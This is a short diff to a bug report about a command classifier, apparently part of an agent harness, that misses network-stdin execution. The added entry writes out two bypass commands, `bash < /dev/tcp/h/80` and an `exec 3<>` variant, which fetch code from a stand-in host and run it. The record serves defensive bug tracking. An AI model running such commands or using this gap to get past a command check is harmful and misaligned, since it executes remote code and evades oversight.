@@ -31,3 +31,7 @@ Not diagnosed yet (the evidence points to `classify_command` only matching curl/
 ## Fix
 
 Not fixed yet.
+
+## Seen again (2026-11-18)
+
+Source: agent run: fix bug-audit-stdin-other-sources-family, out_of_scope_collected (pre-existing). `bash < /dev/tcp/h/80` and `exec 3<> /dev/tcp/h/80; bash <&3` pass: network stdin is read as code.
